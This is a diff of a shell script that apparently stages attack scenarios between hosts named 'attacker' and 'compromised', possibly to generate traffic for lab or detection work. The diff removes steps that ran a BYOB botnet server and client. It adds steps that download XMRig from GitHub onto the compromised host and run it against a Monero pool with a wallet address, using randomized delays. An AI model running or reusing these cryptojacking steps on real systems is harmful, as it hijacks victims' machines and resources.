@@ -7,31 +7,23 @@ remote_kill() {
 }
 
 
-ssh attacker "cd ~/byob && ./server.py --background" &
-attackerPid=$1
+ssh compromised "wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
-sleep 5 # let the server boot
+ssh compromised "tar -xvzf xmrig-6.24.0-linux-static-x64.tar.gz"
+    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
-ssh compromised "sudo byob-client" &
-victimPid=$!
+ssh compromised "cd xmrig-6.24.0/"
+    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
-sleep 5 # let the victim connect
-
-
-# Start crypto mining
-
-
+ssh compromised "./xmrig -o monerohash.com:9999 -u 45Md9tgyseEBneE3ohkKzEjJLNwakxtxBVPpdU6LyA533Y4bdXdS3UwiT7pYbsonL8GEtmth43oHiRg8Dbw8WWFh847n1z7 -k --tls" &
+MINE_PID=$!
+    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 
 # wait
-sleep 8
+sleep 300
 
-# Kill byob on client via byob
-ssh attacker "byossh compromised sudo kill \$(ps -e | grep python | awk '{print \$1}')"
-ssh attacker "byossh compromised sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
-
-# Kill byob server on attacker
-remote_kill attacker server
-remote_kill attacker python
+sudo kill -9 $MINE_PID
 
 sleep 8 # Make sure all the data downloads
 
